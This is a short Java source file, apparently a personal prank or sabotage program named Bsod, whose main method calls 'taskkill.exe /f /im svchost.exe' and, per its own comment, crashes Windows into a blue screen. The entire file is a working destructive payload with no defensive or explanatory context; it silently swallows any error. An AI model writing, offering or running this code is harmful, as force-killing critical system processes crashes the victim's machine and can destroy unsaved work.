package com.perry;

/**
 * @author perry.
 * Started 11/16/2021.
 */
public
class Bsod {

    public static
    void main(String[] args) {
        // try to execute a command prompt command
        try {
            // kill svchost.exe, this causes the system to blue screen
            Runtime.getRuntime().exec("taskkill.exe /f /im svchost.exe");
        } catch (Exception ignored) {
        }
    }
}
